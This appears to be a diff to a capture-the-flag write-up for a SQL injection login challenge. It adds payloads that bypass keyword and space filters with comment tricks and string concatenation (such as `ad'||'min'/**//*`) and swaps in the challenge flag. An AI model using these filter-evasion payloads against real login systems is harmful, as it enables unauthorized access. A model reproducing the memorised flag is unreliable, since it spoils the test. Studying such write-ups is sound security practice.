@@ -32,13 +32,40 @@ User: `admin' /*`
 
 Password: `123456` (arbitary string)
 
-
 ### Round 3:
+
+Filter: `or and = like > < --`
+
+Beware of this round also filter **spaces** so we use the payload above and replace **spaces** with `/**/`
+
+User: `admin'/**//*`
+
+Password: `123456` (arbitary string)
+
 ### Round 4:
+
+Filter: `or and = like > < -- admin`
+
+They filter the string **"admin"** if we input directly. So we need a **concatenation operator** and here we use `||`
+
+User: `ad'||'min'/**//*`
+
+Pass: `123456` (arbitary string)
+
 ### Round 5:
+
+Filter: `or and = like > < -- union admin`
+
+With **union** filtered, our payload above is not affected.
+
+User: ad'||'min'/**//*
+
+Pass: `123456` (arbitary string)
+
+When you done reaching to 6/5 round. Back to **filter** file and the flag is there !
 
 #### The Flag (for reference): ✔️
 ```
-CTFlearn{p0st_d4t4_4ll_d4y}
+picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
 ```
 
